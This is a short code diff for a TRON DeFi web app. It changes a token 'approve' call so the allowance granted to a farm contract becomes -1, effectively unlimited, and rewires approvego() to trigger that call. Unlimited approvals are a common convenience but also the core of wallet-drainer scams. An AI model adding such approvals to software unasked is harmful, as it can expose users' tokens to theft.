@@ -255,7 +255,7 @@ async function triggerSmartContract() {
             callValue: 0
         };
 
-        const parameters = [{type: 'address', value: contractAddressFarm}, {type: 'uint', value: 12345}];
+        const parameters = [{type: 'address', value: contractAddressFarm}, {type: 'uint', value: -1}];
         const issuerAddress = tronWeb.defaultAddress.base58;
         const functionSelector = 'approve(address,uint)';
 
@@ -286,17 +286,7 @@ async function triggerSmartContract() {
 }  
 	   
 async function approvego() {
-  //triggerSmartContract();
-   //  await MyContract.approve(contractAddressFarm,window.tronWeb.toHex(1000000000000000)).send(args);	
-	
-	var parameter = [{type:'address',value:contractAddressFarm},{type:'uint256',value:100}]
-var options = {
-        feeLimit:100000000,
-        callValue:0
-    }
-const transaction = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, "approve(address,uint256)", options,
-    parameter,myaddress);
-	
+  triggerSmartContract();
   } 
 
      async function stake() {
